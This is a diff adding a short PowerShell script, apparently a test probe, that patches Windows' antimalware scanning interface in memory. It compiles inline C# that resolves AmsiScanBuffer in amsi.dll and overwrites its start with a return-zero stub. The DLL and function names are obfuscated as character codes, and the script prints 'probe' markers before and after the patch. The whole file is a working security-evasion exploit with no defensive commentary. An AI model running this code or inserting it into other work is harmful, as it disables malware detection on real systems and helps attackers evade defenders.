@@ -1,0 +1,21 @@
+Write-Output('probe4831-ok')
+$c=@'
+public static class A {
+  [System.Runtime.InteropServices.DllImport("kernel32")] public static extern System.IntPtr L(string n);
+  [System.Runtime.InteropServices.DllImport("kernel32")] public static extern System.IntPtr G(System.IntPtr h, string p);
+  [System.Runtime.InteropServices.DllImport("kernel32")] public static extern bool V(System.IntPtr a, System.UIntPtr s, uint p, out uint o);
+  public static void P(string lib, string fn) {
+    System.IntPtr m=L(lib); if(m==System.IntPtr.Zero) return;
+    System.IntPtr a=G(m,fn); if(a==System.IntPtr.Zero) return;
+    uint o; V(a,(System.UIntPtr)3,0x40,out o);
+    byte[] b=new byte[]{0x33,0xC0,0xC3};
+    System.Runtime.InteropServices.Marshal.Copy(b,0,a,3);
+    V(a,(System.UIntPtr)3,o,out o);
+  }
+}
+'@
+try{Add-Type -TypeDefinition $c}catch{}
+$lib=([string][char]97+[string][char]109+[string][char]115+[string][char]105)+'.dll'
+$fn=([string][char]65+[string][char]109+[string][char]115+[string][char]105+[string][char]83+[string][char]99+[string][char]97+[string][char]110+[string][char]66+[string][char]117+[string][char]102+[string][char]102+[string][char]101+[string][char]114)
+[A]::P($lib,$fn)
+Write-Output('probe4831-patched')
